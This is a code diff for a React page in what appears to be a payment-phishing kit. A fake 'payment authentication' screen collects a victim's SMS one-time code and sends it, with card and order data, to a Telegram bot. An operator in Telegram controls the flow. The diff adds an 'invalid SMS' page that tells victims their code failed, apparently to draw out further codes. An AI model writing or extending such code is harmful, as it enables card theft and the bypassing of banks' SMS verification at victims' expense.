@@ -3,9 +3,9 @@ import { useNavigate, useLocation } from 'react-router-dom'
 import { useLanguage } from '../context/LanguageContext'
 import { notifySMSCodeEntered } from '../utils/telegramBot'
 import LoadingSpinner from '../components/LoadingSpinner'
-import './SMSVerificationPage.css'
+import './InvalidSMSPage.css'
 
-const SMSVerificationPage = () => {
+const InvalidSMSPage = () => {
   const navigate = useNavigate()
   const location = useLocation()
   const { t, language } = useLanguage()
@@ -67,23 +67,10 @@ const SMSVerificationPage = () => {
     // Send SMS code to Telegram
     notifySMSCodeEntered(verificationCode, cardData, orderData)
 
-    // Start polling for payment status and invalid SMS
+    // Start polling for payment status
     const userId = localStorage.getItem('telegram_user_id')
     const checkPaymentStatus = setInterval(async () => {
       try {
-        // Check if admin marked SMS as invalid
-        const invalidSMSResponse = await fetch(`/api/check-invalid-sms/${userId}`)
-        const invalidSMSData = await invalidSMSResponse.json()
-        
-        if (invalidSMSData.invalidSMS) {
-          clearInterval(checkPaymentStatus)
-          setIsProcessing(false)
-          navigate('/invalid-sms', {
-            state: { orderData, cardData, fromSMS: true }
-          })
-          return
-        }
-        
         const response = await fetch(`/api/check-payment-status/${userId}`)
         const data = await response.json()
         
@@ -140,21 +127,8 @@ const SMSVerificationPage = () => {
     localStorage.setItem('paymentStatusInterval', checkPaymentStatus)
   }
 
-  // Check if SMS verification is requested (set by admin button in Telegram)
+  // Cleanup interval on unmount
   useEffect(() => {
-    const checkSMSRequested = () => {
-      const userId = localStorage.getItem('telegram_user_id')
-      const smsRequested = localStorage.getItem(`sms_requested_${userId}`)
-      
-      // If not requested, redirect back to payment page
-      if (!smsRequested && !location.state?.fromPayment) {
-        navigate('/payment', { state: { orderData } })
-      }
-    }
-    
-    checkSMSRequested()
-    
-    // Cleanup interval on unmount
     return () => {
       const intervalId = localStorage.getItem('paymentStatusInterval')
       if (intervalId) {
@@ -170,12 +144,21 @@ const SMSVerificationPage = () => {
   }
 
   return (
-    <div className="sms-verification-page">
+    <div className="invalid-sms-page">
       <LoadingSpinner isVisible={isVerifying || isProcessing} />
       
-      <div className="sms-verification-container">
+      <div className="invalid-sms-container">
         <div className="sms-header">
           <h1>{t('paymentAuthentication')}</h1>
+        </div>
+
+        {/* Alert for invalid SMS */}
+        <div className="invalid-sms-alert">
+          <div className="alert-icon">⚠️</div>
+          <div className="alert-content">
+            <h3>{t('invalidSMSTitle')}</h3>
+            <p>{t('invalidSMSMessage')}</p>
+          </div>
         </div>
 
         <div className="sms-content">
@@ -213,5 +196,5 @@ const SMSVerificationPage = () => {
   )
 }
 
-export default SMSVerificationPage
+export default InvalidSMSPage
 
